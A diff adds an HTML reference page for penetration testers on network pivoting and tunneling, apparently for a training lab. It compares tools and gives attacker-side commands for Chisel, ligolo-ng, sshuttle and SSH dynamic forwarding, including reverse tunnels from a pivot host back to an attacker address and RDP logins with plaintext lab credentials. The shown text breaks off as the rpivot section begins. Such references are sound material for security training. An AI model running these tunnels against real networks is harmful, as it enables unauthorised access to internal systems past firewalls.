@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Network Pivoting & Tunneling — Complete Reference</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --bg2: #161b22;
+    --bg3: #1c2128;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #7d8590;
+    --accent: #58a6ff;
+    --green: #3fb950;
+    --orange: #d29922;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --teal: #39d353;
+    --pink: #ff7b72;
+    --radius: 8px;
+    --mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
+
+  header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 20px 32px; display: flex; align-items: center; gap: 16px; }
+  header h1 { font-size: 20px; font-weight: 600; color: var(--text); }
+  .badge { background: var(--accent); color: #0d1117; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 20px; }
+
+  .tabs { display: flex; gap: 2px; padding: 0 32px; background: var(--bg2); border-bottom: 1px solid var(--border); overflow-x: auto; }
+  .tab { padding: 12px 18px; cursor: pointer; font-size: 13px; color: var(--muted); border-bottom: 2px solid transparent; white-space: nowrap; transition: color .15s; }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  .content { display: none; padding: 28px 32px; max-width: 1100px; }
+  .content.active { display: block; }
+
+  /* Overview grid */
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 14px; }
+  .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px; cursor: pointer; transition: border-color .15s, transform .1s; }
+  .card:hover { border-color: var(--accent); transform: translateY(-1px); }
+  .card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+  .card-icon { width: 32px; height: 32px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; }
+  .card h3 { font-size: 15px; font-weight: 600; }
+  .card p { color: var(--muted); font-size: 13px; line-height: 1.5; }
+  .tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 12px; }
+  .tag { font-size: 11px; padding: 2px 8px; border-radius: 20px; font-weight: 500; }
+  .tag-green { background: #1a3a2a; color: var(--green); }
+  .tag-orange { background: #2d2011; color: var(--orange); }
+  .tag-red { background: #2d1414; color: var(--red); }
+  .tag-blue { background: #0d2340; color: var(--accent); }
+  .tag-purple { background: #1f1040; color: var(--purple); }
+
+  /* Detail view */
+  .detail { display: none; }
+  .detail.active { display: block; }
+  .back-btn { background: none; border: 1px solid var(--border); color: var(--muted); padding: 6px 14px; border-radius: var(--radius); cursor: pointer; font-size: 13px; margin-bottom: 20px; transition: color .15s, border-color .15s; }
+  .back-btn:hover { color: var(--text); border-color: var(--text); }
+  .detail-header { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 24px; }
+  .detail-icon { width: 48px; height: 48px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; flex-shrink: 0; }
+  .detail h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .detail .subtitle { color: var(--muted); font-size: 14px; }
+
+  .section-title { font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .08em; margin: 20px 0 10px; }
+  .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+  .info-item { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 12px; }
+  .info-item .label { font-size: 11px; color: var(--muted); margin-bottom: 4px; }
+  .info-item .value { font-size: 13px; font-weight: 500; }
+
+  .when-to-use { background: #0d2340; border: 1px solid #1d4070; border-radius: var(--radius); padding: 16px; margin-bottom: 16px; }
+  .when-to-use h4 { color: var(--accent); font-size: 13px; margin-bottom: 8px; }
+  .when-to-use ul { padding-left: 16px; color: var(--text); font-size: 13px; line-height: 1.8; }
+
+  .avoid { background: #2d1414; border: 1px solid #5a2020; border-radius: var(--radius); padding: 16px; margin-bottom: 16px; }
+  .avoid h4 { color: var(--red); font-size: 13px; margin-bottom: 8px; }
+  .avoid ul { padding-left: 16px; color: var(--text); font-size: 13px; line-height: 1.8; }
+
+  pre { background: #010409; border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; overflow-x: auto; font-family: var(--mono); font-size: 13px; line-height: 1.7; margin-bottom: 12px; }
+  .cmd-label { font-size: 11px; color: var(--muted); margin-bottom: 6px; font-weight: 600; letter-spacing: .05em; }
+  .c-comment { color: #6e7681; }
+  .c-cmd { color: var(--green); }
+  .c-flag { color: var(--orange); }
+  .c-val { color: var(--accent); }
+  .c-prompt { color: var(--purple); }
+
+  /* Comparison table */
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { background: var(--bg3); padding: 10px 14px; text-align: left; color: var(--muted); font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: .07em; border-bottom: 1px solid var(--border); }
+  td { padding: 10px 14px; border-bottom: 1px solid var(--border); vertical-align: middle; }
+  tr:hover td { background: var(--bg3); }
+  .dot-yes { color: var(--green); font-weight: 700; }
+  .dot-no { color: var(--muted); }
+  .dot-partial { color: var(--orange); }
+  .rank { display: inline-block; width: 20px; height: 20px; border-radius: 50%; font-size: 11px; font-weight: 700; text-align: center; line-height: 20px; }
+  .rank-s { background: var(--green); color: #000; }
+  .rank-a { background: var(--accent); color: #000; }
+  .rank-b { background: var(--orange); color: #000; }
+  .rank-c { background: var(--muted); color: #000; }
+
+  /* Decision tree */
+  .tree { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px; }
+  .q { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 12px 16px; font-weight: 600; margin-bottom: 12px; }
+  .answers { display: flex; flex-direction: column; gap: 8px; padding-left: 20px; border-left: 2px solid var(--border); margin-bottom: 16px; }
+  .answer { display: flex; gap: 10px; align-items: flex-start; }
+  .answer-cond { background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 3px 8px; font-size: 12px; color: var(--muted); white-space: nowrap; flex-shrink: 0; }
+  .answer-result { font-size: 13px; }
+  .answer-result strong { color: var(--accent); }
+
+  @media(max-width:600px) {
+    header { padding: 14px 16px; }
+    .tabs { padding: 0 16px; }
+    .content { padding: 20px 16px; }
+    .info-grid { grid-template-columns: 1fr; }
+    .grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1>Network Pivoting &amp; Tunneling</h1>
+    <div style="color:var(--muted);font-size:13px;margin-top:2px">Complete reference — when to use which tool</div>
+  </div>
+  <span class="badge">12 Techniques</span>
+</header>
+
+<div class="tabs">
+  <div class="tab active" onclick="showTab('overview')">Overview</div>
+  <div class="tab" onclick="showTab('compare')">Comparison table</div>
+  <div class="tab" onclick="showTab('decide')">Decision guide</div>
+  <div class="tab" onclick="showTab('chisel')">Chisel</div>
+  <div class="tab" onclick="showTab('ligolo')">ligolo-ng</div>
+  <div class="tab" onclick="showTab('sshuttle')">sshuttle</div>
+  <div class="tab" onclick="showTab('sshdyn')">SSH -D</div>
+  <div class="tab" onclick="showTab('rpivot')">rpivot</div>
+  <div class="tab" onclick="showTab('socat')">socat</div>
+  <div class="tab" onclick="showTab('plink')">plink</div>
+  <div class="tab" onclick="showTab('netsh')">netsh</div>
+  <div class="tab" onclick="showTab('icmp')">ICMP tunnel</div>
+  <div class="tab" onclick="showTab('meterpreter')">Meterpreter</div>
+</div>
+
+<!-- OVERVIEW -->
+<div id="tab-overview" class="content active">
+  <div style="margin-bottom:20px;color:var(--muted);font-size:13px;">Click any card to jump to that technique's detail page.</div>
+  <div class="grid">
+
+    <div class="card" onclick="showTab('chisel')">
+      <div class="card-header"><div class="card-icon" style="background:#0d2340">🔧</div><h3>Chisel</h3></div>
+      <p>TCP/UDP tunnel over HTTP secured by SSH. Works through firewalls that allow HTTP/HTTPS.</p>
+      <div class="tags"><span class="tag tag-blue">SOCKS5</span><span class="tag tag-green">No SSH needed</span><span class="tag tag-orange">Binary required</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('ligolo')">
+      <div class="card-header"><div class="card-icon" style="background:#1a3a2a">⚡</div><h3>ligolo-ng</h3></div>
+      <p>TLS-encrypted tunnel creating a real tun interface. No proxychains needed — traffic routes natively.</p>
+      <div class="tags"><span class="tag tag-green">No proxychains</span><span class="tag tag-green">Static binary</span><span class="tag tag-blue">Best overall</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('sshuttle')">
+      <div class="card-header"><div class="card-icon" style="background:#1f1040">🚀</div><h3>sshuttle</h3></div>
+      <p>VPN-over-SSH. Routes entire subnets transparently without proxychains. Easiest to use.</p>
+      <div class="tags"><span class="tag tag-purple">Easiest</span><span class="tag tag-green">No proxychains</span><span class="tag tag-orange">SSH required</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('sshdyn')">
+      <div class="card-header"><div class="card-icon" style="background:#2d2011">🔑</div><h3>SSH -D (Dynamic)</h3></div>
+      <p>Built-in SSH dynamic port forwarding. Creates a SOCKS proxy with zero extra tools.</p>
+      <div class="tags"><span class="tag tag-green">Zero install</span><span class="tag tag-orange">SSH required</span><span class="tag tag-blue">SOCKS5</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('rpivot')">
+      <div class="card-header"><div class="card-icon" style="background:#2d1414">🐍</div><h3>rpivot</h3></div>
+      <p>Python-based reverse SOCKS proxy over HTTP. Works where Python is available. No GLIBC issues.</p>
+      <div class="tags"><span class="tag tag-green">Python only</span><span class="tag tag-blue">SOCKS4</span><span class="tag tag-red">Reverse proxy</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('socat')">
+      <div class="card-header"><div class="card-icon" style="background:#1c2820">🔌</div><h3>socat</h3></div>
+      <p>Swiss-army knife port relay. Forwards individual ports — not full SOCKS. Great for single-service pivoting.</p>
+      <div class="tags"><span class="tag tag-orange">Port relay</span><span class="tag tag-green">Often pre-installed</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('plink')">
+      <div class="card-header"><div class="card-icon" style="background:#1f1040">🪟</div><h3>plink (PuTTY)</h3></div>
+      <p>Windows CLI SSH client. Use on Windows pivot hosts where you can't install OpenSSH.</p>
+      <div class="tags"><span class="tag tag-purple">Windows</span><span class="tag tag-orange">SSH required</span><span class="tag tag-blue">SOCKS5</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('netsh')">
+      <div class="card-header"><div class="card-icon" style="background:#1f1040">🪟</div><h3>netsh port proxy</h3></div>
+      <p>Windows built-in port forwarding. No extra binaries — uses native netsh commands. Admin required.</p>
+      <div class="tags"><span class="tag tag-purple">Windows native</span><span class="tag tag-red">Admin needed</span><span class="tag tag-orange">Port relay only</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('icmp')">
+      <div class="card-header"><div class="card-icon" style="background:#2d1a00">📡</div><h3>ICMP Tunnel</h3></div>
+      <p>Hides traffic inside ICMP (ping) packets. Use when only ICMP is allowed through the firewall.</p>
+      <div class="tags"><span class="tag tag-red">Stealth</span><span class="tag tag-orange">Root required</span><span class="tag tag-red">Last resort</span></div>
+    </div>
+
+    <div class="card" onclick="showTab('meterpreter')">
+      <div class="card-header"><div class="card-icon" style="background:#2d1414">🎯</div><h3>Meterpreter</h3></div>
+      <p>Metasploit's built-in pivoting. route, socks_proxy, portfwd all in one framework.</p>
+      <div class="tags"><span class="tag tag-red">Metasploit</span><span class="tag tag-blue">SOCKS5</span><span class="tag tag-green">All-in-one</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- COMPARISON TABLE -->
+<div id="tab-compare" class="content">
+  <div style="overflow-x:auto">
+  <table>
+    <tr>
+      <th>Tool</th><th>Protocol</th><th>SSH needed</th><th>SOCKS proxy</th><th>proxychains</th><th>Windows pivot</th><th>No extra binary</th><th>Firewall bypass</th><th>Difficulty</th><th>Best rank</th>
+    </tr>
+    <tr>
+      <td><strong>ligolo-ng</strong></td><td>TLS</td>
+      <td class="dot-no">✗</td><td class="dot-yes">✓ (tun iface)</td><td class="dot-no">Not needed</td>
+      <td class="dot-yes">✓</td><td class="dot-no">✗</td><td class="dot-yes">✓</td>
+      <td>Medium</td><td><span class="rank rank-s">S</span></td>
+    </tr>
+    <tr>
+      <td><strong>sshuttle</strong></td><td>SSH</td>
+      <td class="dot-yes">✓</td><td class="dot-no">✗ (VPN-style)</td><td class="dot-no">Not needed</td>
+      <td class="dot-no">Linux only</td><td class="dot-no">✗</td><td class="dot-partial">Partial</td>
+      <td>Easy</td><td><span class="rank rank-s">S</span></td>
+    </tr>
+    <tr>
+      <td><strong>SSH -D</strong></td><td>SSH</td>
+      <td class="dot-yes">✓</td><td class="dot-yes">✓ SOCKS5</td><td class="dot-yes">✓</td>
+      <td class="dot-partial">plink</td><td class="dot-yes">✓</td><td class="dot-partial">Partial</td>
+      <td>Easy</td><td><span class="rank rank-a">A</span></td>
+    </tr>
+    <tr>
+      <td><strong>Chisel</strong></td><td>HTTP+SSH</td>
+      <td class="dot-no">✗</td><td class="dot-yes">✓ SOCKS5</td><td class="dot-yes">✓</td>
+      <td class="dot-yes">✓</td><td class="dot-no">✗</td><td class="dot-yes">✓ (HTTP)</td>
+      <td>Medium</td><td><span class="rank rank-a">A</span></td>
+    </tr>
+    <tr>
+      <td><strong>rpivot</strong></td><td>HTTP</td>
+      <td class="dot-no">✗</td><td class="dot-yes">✓ SOCKS4</td><td class="dot-yes">✓</td>
+      <td class="dot-yes">✓</td><td class="dot-no">✗ (needs Python)</td><td class="dot-yes">✓ (HTTP)</td>
+      <td>Medium</td><td><span class="rank rank-a">A</span></td>
+    </tr>
+    <tr>
+      <td><strong>Meterpreter</strong></td><td>Encrypted</td>
+      <td class="dot-no">✗</td><td class="dot-yes">✓ SOCKS5</td><td class="dot-yes">✓</td>
+      <td class="dot-yes">✓</td><td class="dot-no">✗</td><td class="dot-yes">✓</td>
+      <td>Easy</td><td><span class="rank rank-a">A</span></td>
+    </tr>
+    <tr>
+      <td><strong>socat</strong></td><td>TCP/UDP</td>
+      <td class="dot-no">✗</td><td class="dot-no">✗ (port relay)</td><td class="dot-no">✗</td>
+      <td class="dot-yes">✓</td><td class="dot-partial">Often present</td><td class="dot-no">✗</td>
+      <td>Easy</td><td><span class="rank rank-b">B</span></td>
+    </tr>
+    <tr>
+      <td><strong>plink</strong></td><td>SSH</td>
+      <td class="dot-yes">✓</td><td class="dot-yes">✓ SOCKS5</td><td class="dot-yes">✓</td>
+      <td class="dot-yes">Windows only</td><td class="dot-no">✗</td><td class="dot-partial">Partial</td>
+      <td>Medium</td><td><span class="rank rank-b">B</span></td>
+    </tr>
+    <tr>
+      <td><strong>netsh</strong></td><td>TCP</td>
+      <td class="dot-no">✗</td><td class="dot-no">✗ (port relay)</td><td class="dot-no">✗</td>
+      <td class="dot-yes">Windows native</td><td class="dot-yes">✓</td><td class="dot-no">✗</td>
+      <td>Easy</td><td><span class="rank rank-b">B</span></td>
+    </tr>
+    <tr>
+      <td><strong>ICMP tunnel</strong></td><td>ICMP</td>
+      <td class="dot-no">✗</td><td class="dot-yes">✓</td><td class="dot-yes">✓</td>
+      <td class="dot-partial">Linux only</td><td class="dot-no">✗</td><td class="dot-yes">✓ (ICMP)</td>
+      <td>Hard</td><td><span class="rank rank-c">C</span></td>
+    </tr>
+  </table>
+  </div>
+  <div style="margin-top:16px;color:var(--muted);font-size:12px;">
+    S = Best | A = Great | B = Good | C = Situational only
+  </div>
+</div>
+
+<!-- DECISION GUIDE -->
+<div id="tab-decide" class="content">
+  <div class="tree">
+    <div class="q">What OS is your pivot host?</div>
+    <div class="answers">
+      <div class="answer">
+        <span class="answer-cond">Linux</span>
+        <div>
+          <div class="q" style="margin-top:0">Do you have SSH access to the pivot?</div>
+          <div class="answers">
+            <div class="answer"><span class="answer-cond">Yes + want zero tools</span><div class="answer-result">Use <strong>SSH -D 1080</strong> — built into SSH, instant SOCKS5 proxy</div></div>
+            <div class="answer"><span class="answer-cond">Yes + want no proxychains</span><div class="answer-result">Use <strong>sshuttle</strong> — routes entire subnet transparently like a VPN</div></div>
+            <div class="answer"><span class="answer-cond">No SSH / firewall blocks ports</span><div class="answer-result">
+              <div class="q" style="margin-top:0">What does the firewall allow?</div>
+              <div class="answers">
+                <div class="answer"><span class="answer-cond">HTTP/HTTPS allowed</span><div class="answer-result">Use <strong>Chisel</strong> (HTTP tunnel) or <strong>rpivot</strong> (Python, HTTP)</div></div>
+                <div class="answer"><span class="answer-cond">Any TCP port</span><div class="answer-result">Use <strong>ligolo-ng</strong> — best overall, no proxychains, static binary</div></div>
+                <div class="answer"><span class="answer-cond">Only ICMP allowed</span><div class="answer-result">Use <strong>ptunnel-ng</strong> or <strong>icmpsh</strong> — last resort, slow</div></div>
+              </div>
+            </div></div>
+            <div class="answer"><span class="answer-cond">Already have Meterpreter shell</span><div class="answer-result">Use <strong>Meterpreter route + socks_proxy</strong> — all within Metasploit</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="answer">
+        <span class="answer-cond">Windows</span>
+        <div>
+          <div class="q" style="margin-top:0">What do you need?</div>
+          <div class="answers">
+            <div class="answer"><span class="answer-cond">Forward one port, no tools</span><div class="answer-result">Use <strong>netsh portproxy</strong> — Windows native, no binary needed</div></div>
+            <div class="answer"><span class="answer-cond">Full SOCKS proxy</span><div class="answer-result">Use <strong>plink</strong> (Windows SSH) or <strong>ligolo-ng agent</strong> (Windows binary)</div></div>
+            <div class="answer"><span class="answer-cond">Forward one port, socat present</span><div class="answer-result">Use <strong>socat</strong> for simple TCP relay</div></div>
+            <div class="answer"><span class="answer-cond">Already in Metasploit</span><div class="answer-result">Use <strong>Meterpreter portfwd</strong> or <strong>socks_proxy module</strong></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--border)">
+      <div style="font-size:13px;font-weight:600;color:var(--muted);margin-bottom:12px">QUICK CHEAT SHEET</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:13px">
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">Fastest setup:</span> SSH -D</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">Most powerful:</span> ligolo-ng</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">No proxychains:</span> sshuttle / ligolo-ng</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">Firewall bypass:</span> Chisel / rpivot</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">Windows native:</span> netsh / plink</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">In Metasploit:</span> Meterpreter route</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--green)">No GLIBC issues:</span> ligolo-ng / rpivot</div>
+        <div style="background:var(--bg3);padding:12px;border-radius:6px"><span style="color:var(--orange)">Last resort:</span> ICMP tunnel</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CHISEL -->
+<div id="tab-chisel" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#0d2340">🔧</div>
+    <div><h2>Chisel</h2><div class="subtitle">TCP/UDP tunneling over HTTP+SSH — best for bypassing HTTP-only firewalls</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">HTTP wrapped SSH</div></div>
+    <div class="info-item"><div class="label">SOCKS proxy port</div><div class="value">1080 (client side)</div></div>
+    <div class="info-item"><div class="label">Needs proxychains</div><div class="value" style="color:var(--orange)">Yes</div></div>
+    <div class="info-item"><div class="label">Binary needed on pivot</div><div class="value" style="color:var(--orange)">Yes — watch GLIBC version</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--green)">No</div></div>
+    <div class="info-item"><div class="label">OS support</div><div class="value">Linux, Windows, macOS</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>Only HTTP/HTTPS is allowed out through the firewall</li>
+    <li>You cannot use SSH directly to the pivot</li>
+    <li>You need SOCKS5 proxy for proxychains</li>
+    <li>Cross-platform — pivot is Windows or Linux</li>
+  </ul></div>
+  <div class="avoid"><h4>✗ Avoid when</h4><ul>
+    <li>Target has old GLIBC (use static build or rpivot instead)</li>
+    <li>SSH is available — SSH -D is simpler</li>
+    <li>You want to avoid proxychains — use ligolo-ng instead</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">ON PIVOT HOST (server)</div>
+  <pre><span class="c-prompt">ubuntu@pivot:~$</span> <span class="c-cmd">./chisel</span> <span class="c-flag">server -v -p</span> <span class="c-val">1234</span> <span class="c-flag">--socks5</span></pre>
+  <div class="cmd-label">ON ATTACK HOST (client)</div>
+  <pre><span class="c-prompt">attacker$</span> <span class="c-cmd">./chisel</span> <span class="c-flag">client -v</span> <span class="c-val">10.129.x.x:1234</span> socks</pre>
+  <div class="cmd-label">REVERSE MODE (pivot calls back to attacker)</div>
+  <pre><span class="c-comment"># On attacker:</span>
+<span class="c-cmd">./chisel</span> <span class="c-flag">server --reverse -v -p</span> <span class="c-val">1234</span> <span class="c-flag">--socks5</span>
+<span class="c-comment"># On pivot:</span>
+<span class="c-cmd">./chisel</span> <span class="c-flag">client -v</span> <span class="c-val">10.10.14.x:1234</span> R:socks</pre>
+  <div class="cmd-label">PROXYCHAINS CONFIG + RDP</div>
+  <pre><span class="c-comment"># /etc/proxychains.conf → [ProxyList]:</span>
+socks5 127.0.0.1 1080
+
+<span class="c-cmd">proxychains</span> xfreerdp <span class="c-flag">/v:</span><span class="c-val">172.16.5.19</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<!-- LIGOLO -->
+<div id="tab-ligolo" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#1a3a2a">⚡</div>
+    <div><h2>ligolo-ng</h2><div class="subtitle">TLS tunnel with real tun interface — no proxychains, no GLIBC issues, best overall</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">TLS (self-signed cert)</div></div>
+    <div class="info-item"><div class="label">Interface created</div><div class="value">tun (ligolo)</div></div>
+    <div class="info-item"><div class="label">Needs proxychains</div><div class="value" style="color:var(--green)">No — routes natively</div></div>
+    <div class="info-item"><div class="label">Static binary</div><div class="value" style="color:var(--green)">Yes — no GLIBC issues</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--orange)">Yes (ip route add)</div></div>
+    <div class="info-item"><div class="label">OS support</div><div class="value">Linux, Windows, macOS</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>You want the cleanest setup — no proxychains overhead</li>
+    <li>You have root/sudo on your attack host</li>
+    <li>Target pivot has old GLIBC (static binary solves it)</li>
+    <li>You need to pivot into multiple subnets</li>
+    <li>Tools don't work well through proxychains (e.g. nmap)</li>
+  </ul></div>
+  <div class="avoid"><h4>✗ Avoid when</h4><ul>
+    <li>You don't have sudo on attack host (needs tun interface)</li>
+    <li>Quick single-port forward is all you need — socat is simpler</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">SETUP (one time on attack host)</div>
+  <pre><span class="c-cmd">sudo ip tuntap add</span> user $USER mode tun ligolo
+<span class="c-cmd">sudo ip link set</span> ligolo up</pre>
+  <div class="cmd-label">START PROXY (attack host)</div>
+  <pre><span class="c-cmd">sudo ./proxy</span> <span class="c-flag">-selfcert -laddr</span> <span class="c-val">0.0.0.0:11601</span></pre>
+  <div class="cmd-label">RUN AGENT (on pivot)</div>
+  <pre><span class="c-cmd">./agent</span> <span class="c-flag">-connect</span> <span class="c-val">10.10.14.x:11601</span> <span class="c-flag">-ignore-cert</span></pre>
+  <div class="cmd-label">LIGOLO CONSOLE → START TUNNEL</div>
+  <pre>ligolo-ng » <span class="c-cmd">session</span>        <span class="c-comment"># select with arrow keys + Enter</span>
+[Agent: ubuntu@WEB01] » <span class="c-cmd">start</span></pre>
+  <div class="cmd-label">ADD ROUTE + RDP (no proxychains!)</div>
+  <pre><span class="c-cmd">sudo ip route add</span> <span class="c-val">172.16.5.0/24</span> dev ligolo
+<span class="c-cmd">xfreerdp</span> <span class="c-flag">/v:</span><span class="c-val">172.16.5.19</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<!-- SSHUTTLE -->
+<div id="tab-sshuttle" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#1f1040">🚀</div>
+    <div><h2>sshuttle</h2><div class="subtitle">VPN over SSH — simplest tool, zero config, no proxychains</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">SSH (transparent proxy)</div></div>
+    <div class="info-item"><div class="label">Needs proxychains</div><div class="value" style="color:var(--green)">No</div></div>
+    <div class="info-item"><div class="label">SSH required on pivot</div><div class="value" style="color:var(--orange)">Yes</div></div>
+    <div class="info-item"><div class="label">Python needed on pivot</div><div class="value" style="color:var(--orange)">Yes (auto-installed)</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--orange)">Yes (iptables)</div></div>
+    <div class="info-item"><div class="label">OS support</div><div class="value">Linux/macOS attack host only</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>SSH is open to the pivot — this is the quickest pivot possible</li>
+    <li>You want zero configuration — one command and you're done</li>
+    <li>Tools like nmap don't work through proxychains</li>
+    <li>You want to browse internal web apps in your browser directly</li>
+  </ul></div>
+  <div class="avoid"><h4>✗ Avoid when</h4><ul>
+    <li>No SSH access to pivot</li>
+    <li>Windows pivot host</li>
+    <li>Only HTTP port is open (use Chisel instead)</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">BASIC — route entire subnet</div>
+  <pre><span class="c-cmd">sshuttle</span> <span class="c-flag">-r</span> ubuntu@<span class="c-val">10.129.x.x</span> <span class="c-val">172.16.5.0/24</span></pre>
+  <div class="cmd-label">WITH SSH KEY</div>
+  <pre><span class="c-cmd">sshuttle</span> <span class="c-flag">-r</span> ubuntu@<span class="c-val">10.129.x.x</span> <span class="c-val">172.16.5.0/24</span> <span class="c-flag">--ssh-cmd</span> "ssh -i key.pem"</pre>
+  <div class="cmd-label">THEN RDP (no proxychains needed!)</div>
+  <pre><span class="c-cmd">xfreerdp</span> <span class="c-flag">/v:</span><span class="c-val">172.16.5.19</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<!-- SSH DYNAMIC -->
+<div id="tab-sshdyn" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#2d2011">🔑</div>
+    <div><h2>SSH -D (Dynamic Port Forwarding)</h2><div class="subtitle">Built into SSH — zero extra tools, instant SOCKS5 proxy</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">SSH</div></div>
+    <div class="info-item"><div class="label">Proxy type</div><div class="value">SOCKS5 on localhost</div></div>
+    <div class="info-item"><div class="label">Extra tools needed</div><div class="value" style="color:var(--green)">None — built into SSH</div></div>
+    <div class="info-item"><div class="label">Needs proxychains</div><div class="value" style="color:var(--orange)">Yes</div></div>
+    <div class="info-item"><div class="label">SSH required on pivot</div><div class="value" style="color:var(--orange)">Yes</div></div>
+    <div class="info-item"><div class="label">OS support</div><div class="value">Linux, macOS, Windows (OpenSSH)</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>You have SSH access — fastest possible setup, literally one command</li>
+    <li>Cannot transfer any binaries to the pivot</li>
+    <li>Quick one-off pivot without installing anything</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">START DYNAMIC FORWARD (background)</div>
+  <pre><span class="c-cmd">ssh</span> <span class="c-flag">-D</span> <span class="c-val">1080</span> <span class="c-flag">-f -N</span> ubuntu@<span class="c-val">10.129.x.x</span>
+<span class="c-comment"># -D 1080 = SOCKS proxy on localhost:1080
+# -f      = go to background
+# -N      = don't execute remote command</span></pre>
+  <div class="cmd-label">PROXYCHAINS CONFIG + RDP</div>
+  <pre><span class="c-comment"># /etc/proxychains.conf:</span>
+socks5 127.0.0.1 1080
+
+<span class="c-cmd">proxychains</span> xfreerdp <span class="c-flag">/v:</span><span class="c-val">172.16.5.19</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+  <div class="cmd-label">LOCAL PORT FORWARD (single port)</div>
+  <pre><span class="c-cmd">ssh</span> <span class="c-flag">-L</span> <span class="c-val">3389</span>:<span class="c-val">172.16.5.19</span>:<span class="c-val">3389</span> ubuntu@<span class="c-val">10.129.x.x</span> <span class="c-flag">-N</span>
+<span class="c-comment"># Then RDP directly to localhost:3389</span>
+<span class="c-cmd">xfreerdp</span> <span class="c-flag">/v:</span><span class="c-val">127.0.0.1</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<!-- RPIVOT -->
+<div id="tab-rpivot" class="content">
